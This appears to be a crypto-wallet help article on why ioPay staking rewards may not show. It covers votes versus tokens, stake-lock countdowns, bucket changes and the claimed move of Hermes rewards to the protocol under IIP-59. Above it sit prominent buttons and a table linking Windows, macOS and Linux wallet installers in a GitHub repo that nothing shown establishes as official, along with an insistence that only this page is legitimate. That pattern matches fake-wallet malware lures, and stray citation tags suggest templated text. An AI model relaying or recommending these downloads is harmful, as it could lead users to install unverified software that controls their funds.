![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Staking Rewards Not Showing? What Changed and What to Check

**Being on an older build.** The problems users reported were fixed in v2.0.2, the current release, so update - but do not expect an update to conjure a reward that was never accrued, and a version mismatch can misdisplay a figure without stopping the protocol paying.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

Most "my rewards disappeared" reports are not missing rewards at all. They are one of four things: **you are reading votes instead of tokens, a stake-lock change started a countdown, a bucket change moved the accrual, or you are looking for a Hermes claim step that no longer exists.**

That last one has caused the most confusion recently, so it goes first.

## The Hermes question, settled

**Voter rewards used to be distributed off-chain by Hermes. They are now protocol-native**, moved in under **IIP-59** after the October 2026 Zanzibar upgrade.

In practice:

- There is no separate Hermes claim to make, and no off-chain payout schedule to wait for.
- Rewards accrue **to your staking position**, in the protocol.
- A guide that tells you to "claim from Hermes weekly" is describing how it worked before the upgrade.

So if you went looking for a claim button and did not find one, that is the change working as intended - not a bug in your wallet.

## Check 1: are you reading votes?

This is the most common false alarm in the whole staking cluster. Your position shows a **vote count**, and vote weight is not the token balance.

Vote weight reflects the chain's vote-power mechanics rather than a 1:1 balance, so a position can display more votes than the IOTX behind it. Withdrawing returns **the staked amount plus rewards** - not the vote number. Nothing is lost when the two do not match, and the difference is not "extra" either.

If you are comparing a reward figure against your vote count and expecting them to reconcile, they will not. [How to stake](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) covers the vote/token distinction in full.

## Check 2: did stake-lock change?

Stake-lock is the switch that decides whether a bucket can be withdrawn early. **Turning it off starts the unstaking countdown** - and once a bucket is in that countdown, it stops accruing new rewards.

So a reward figure that stops moving right after you toggled something is usually you having started an exit, not a display failure. If that was not your intention, the position can be re-staked, subject to the normal duration rules. [How unstaking works](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md) explains the sequence.

## Check 3: did the bucket change?

A staking position is a **bucket**, and buckets are not always stable:

- **Compounding** creates or grows a compound bucket - if you re-staked rewards, the new stake may be a different bucket from the one you were watching.
- **Splitting a stake** across validators gives you more than one bucket, each with its own accrual.
- **A bucket ID you noted earlier** may no longer be the bucket earning now.

If the rewards "moved", check the bucket list for a second bucket before concluding they stopped. [Compounding rewards](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-compound-iotx-rewards-in-iopay.md) covers what a re-stake does to the bucket structure.

## Check 4: is this a display problem?

If the on-chain position is earning but the app shows nothing, that is a display or sync issue rather than a protocol one. Two quick tests:

- **Reopen the app and refresh** the staking view.
- **Check the same account's position on a chain explorer** - if the explorer shows accrual and the app does not, the app is behind, not the chain.

Persistent sync failures route through [network errors](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-not-connecting-to-network.md) and [balance not updating](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-balance-not-updating.md). A stale balance and a missing reward usually arrive together, because they have the same cause.

## What is *not* a cause

**Changing validator.** Delegating to a different validator changes who you are backing, not whether rewards accrue. What it can change is the rate - validators differ in commission and performance - which is [a choice worth making deliberately](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/best-iotex-validator-for-iopay-staking.md).


**The app being closed.** Accrual is on-chain. Closing the app does not pause it, and opening it does not trigger a payout.

**What to do after updating.** Reopen the app and let the staking dashboard load, then read the position before the reward figure: the bucket, the validator, the stake-lock state and the countdown all describe where the stake is, while the reward figure only describes what it has earned so far (F021, F043). If the four possibilities above are ruled out and the number still does not move, treat it as a read problem and work the sync ladder, rather than re-staking to force a display to change.

## FAQ

**Why are my ioPay staking rewards not showing?**
Check in this order: votes vs tokens, stake-lock and the unstaking countdown, whether a bucket change moved the accrual, then whether it is a display/sync problem. The Hermes claim step is gone - that is expected since IIP-59.

**Why did my reward stop after a bucket change?**
Because the bucket you were watching is no longer the bucket earning. Look for a compound or split bucket in the list.

**Are IoTeX staking rewards still distributed by Hermes?**
No. Voter rewards are protocol-native under IIP-59, after the October 2026 Zanzibar upgrade. There is no separate Hermes claim.

**Do I lose rewards if I unstake?**
Rewards already accrued belong to the position and are withdrawn with it. What stops is new accrual once the countdown starts. The tokens themselves are not destroyed by staking - they are locked, and exposed to slashing, which is the real risk to understand before you stake.

---

*Reward distribution follows IIP-59 and the protocol-native model. This page quotes no APY - the rate varies by validator and over time, and [the calculator page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-staking-apy-calculator-guide.md) explains the method instead.*
